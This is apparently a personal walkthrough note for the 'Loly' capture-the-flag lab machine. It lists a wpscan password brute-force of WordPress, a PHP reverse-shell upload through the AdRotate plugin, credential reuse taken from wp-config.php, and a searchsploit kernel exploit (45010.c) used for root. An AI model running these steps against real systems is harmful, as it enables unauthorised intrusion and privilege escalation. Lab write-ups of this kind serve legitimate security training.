----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Loly
# 21/2/2023

----------------------------------------------------
# wordpress
----------------------------------------------------
wpscan --url http://loly.lc/wordpress/  -U loly -P /usr/share/wordlists/rockyou.txt     
Username: loly, Password: fernando
AdRotate
>wp-admin>login>adrotae>managemedia>upload file>php rev shell>ip/wordpress/wp-content/banners.shell.php

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)


http://192.168.107.121/wordpress/

----------------------------------------------------
# priv esc
----------------------------------------------------
->www-data@ubuntu:~/html/wordpress$ cat wp-config.php
/** MySQL database username /
define( 'DB_USER', 'wordpress' );
/** MySQL database password /
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );

su loly
lolyisabeautifulgirl

->cat /etc/passwd
seachsploit ubuntu 4.4.0
->uname -a
Linux ubuntu 4.4.0-31-generic 
->searchsploit -m 45010.c  
mv exploit to client run run got a root
